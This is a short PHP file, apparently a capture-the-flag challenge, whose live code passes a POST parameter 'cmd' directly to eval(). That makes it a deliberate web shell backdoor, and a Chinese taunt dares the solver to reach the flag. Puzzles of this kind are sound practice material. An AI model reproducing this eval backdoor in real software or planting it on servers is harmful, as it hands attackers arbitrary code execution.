<!--
ini_set('open_basedir', '/www/admin/localhost_81/wwwroot/class02' . $dir);
error_reporting(0);
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    if($cmd)
    {
        eval($cmd);
    }
    else{
        echo "给你留个后门又能怎样？能拿到我根目录下的flag么？";
    }
}
-->

<?php
error_reporting(0);
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    if($cmd)
    {
        eval($cmd);
    }
    else{
        echo "给你留个后门又能怎样？能拿到我根目录下的flag么？";
    }
}
?>
